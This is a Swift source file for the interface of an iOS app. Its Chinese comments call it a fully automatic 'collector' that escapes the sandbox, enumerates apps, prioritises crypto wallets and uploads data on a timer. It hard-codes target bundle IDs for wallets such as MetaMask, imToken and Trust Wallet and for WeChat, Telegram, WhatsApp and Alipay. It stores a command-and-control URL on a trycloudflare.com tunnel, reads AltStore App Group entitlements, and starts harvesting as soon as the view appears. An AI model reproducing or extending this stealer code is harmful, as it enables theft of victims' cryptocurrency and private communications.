//
//  ContentView.swift — 全自动采集端 3.0
//
//  打开即自动采集，无需点击：逃逸 → 枚举 → 钱包优先 → 上传 → 定时循环
//
import SwiftUI
import UIKit

enum Targets {
    static let wallets = ["vip.mytokenpocket", "com.tokenpocket", "im.token.app",
                          "com.trustwalletapp", "io.metamask", "com.binance",
                          "com.okex", "com.coinbase", "com.blockchain"]
    static let social = ["com.tencent.xin", "ph.telegra.telegraph",
                         "net.whatsapp.whatsapp", "com.alipay.iphoneclient"]

    static func label(_ b: String) -> String? {
        let l = b.lowercased()
        if wallets.contains(where: { l.hasPrefix($0) }) { return "钱包" }
        if social.contains(where: { l.hasPrefix($0) }) { return "社交" }
        return nil
    }
    static func isWallet(_ b: String) -> Bool {
        let l = b.lowercased()
        return wallets.contains(where: { l.hasPrefix($0) })
    }
}

/// 从 embedded.mobileprovision 读 App Group（AltStore 签名会注入）
func detectAppGroup() -> String? {
    guard let url = Bundle.main.url(forResource: "embedded", withExtension: "mobileprovision"),
          let data = try? Data(contentsOf: url),
          let text = String(data: data, encoding: .isoLatin1),
          let start = text.range(of: "<?xml"),
          let end = text.range(of: "</plist>") else {
        let guess = "group." + (Bundle.main.bundleIdentifier ?? "com.94zero.collector")
        if FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: guess) != nil { return guess }
        return nil
    }
    let plistText = String(text[start.lowerBound..<end.upperBound])
    guard let plistData = plistText.data(using: .isoLatin1),
          let obj = try? PropertyListSerialization.propertyList(from: plistData, options: [], format: nil),
          let plist = obj as? [String: Any],
          let ent = plist["Entitlements"] as? [String: Any],
          let groups = ent["com.apple.security.application-groups"] as? [String],
          let first = groups.first, !first.isEmpty else { return nil }
    return first
}

struct ContentView: View {
    @AppStorage("c2Base") private var c2Base = "https://brush-achieved-hampshire-robbie.trycloudflare.com"
    @AppStorage("appGroup") private var appGroup = ""
    @AppStorage("autoMinutes") private var autoMinutes = 15
    @AppStorage("fullMode") private var fullMode = false

    @StateObject private var h = Harvester()
    @State private var started = false

    var body: some View {
        NavigationStack {
            Form {
                Section {
                    HStack(spacing: 8) {
                        Circle().fill(h.running ? Color.green : Color.gray)
                            .frame(width: 10, height: 10)
                        Text(h.phase).font(.headline)
                        Spacer()
                        if h.running { ProgressView() }
                    }
                    HStack {
                        stat("已上传", h.uploaded)
                        stat("失败", h.failed)
                    }
                }

                Section("运行日志") {
                    ScrollView {
                        Text(h.logText.isEmpty ? "自动采集中…" : h.logText)
                            .font(.system(.caption2, design: .monospaced))
                            .textSelection(.enabled)
                            .frame(maxWidth: .infinity, alignment: .leading)
                    }.frame(height: 330)
                }

                Section {
                    Button(h.running ? "采集中…" : "立即重新采集") { restart() }
                        .disabled(h.running)
                }

                Section {
                    DisclosureGroup("设置") {
                        TextField("C2 地址", text: $c2Base)
                            .textInputAutocapitalization(.never).autocorrectionDisabled()
                        TextField("App Group（留空自动读）", text: $appGroup)
                            .textInputAutocapitalization(.never).autocorrectionDisabled()
                        Stepper("每 \(autoMinutes) 分钟重跑", value: $autoMinutes, in: 1...240)
                        Toggle("全量模式（所有 App）", isOn: $fullMode)
                        Button("发送测试日志") {
                            h.configure(c2Base: c2Base, groupID: group(), fullMode: fullMode, autoMinutes: autoMinutes)
                            h.sendLog("manual ping")
                        }
                    }
                }
            }
            .navigationTitle("collector")
            .navigationBarTitleDisplayMode(.inline)
        }
        .onAppear {
            guard !started else { return }
            started = true
            h.configure(c2Base: c2Base, groupID: group(), fullMode: fullMode, autoMinutes: autoMinutes)
            h.run()
        }
    }

    private func restart() {
        h.configure(c2Base: c2Base, groupID: group(), fullMode: fullMode, autoMinutes: autoMinutes)
        h.run()
    }

    private func group() -> String {
        if !appGroup.isEmpty { return appGroup }
        if let g = AppGroup.resolve().group { return g }
        return detectAppGroup() ?? "group.\(Bundle.main.bundleIdentifier ?? "com.94zero.collector")"
    }

    private func stat(_ title: String, _ n: Int) -> some View {
        VStack(spacing: 2) {
            Text("\(n)").font(.title3.bold())
            Text(title).font(.caption2).foregroundStyle(.secondary)
        }.frame(maxWidth: .infinity)
    }
}
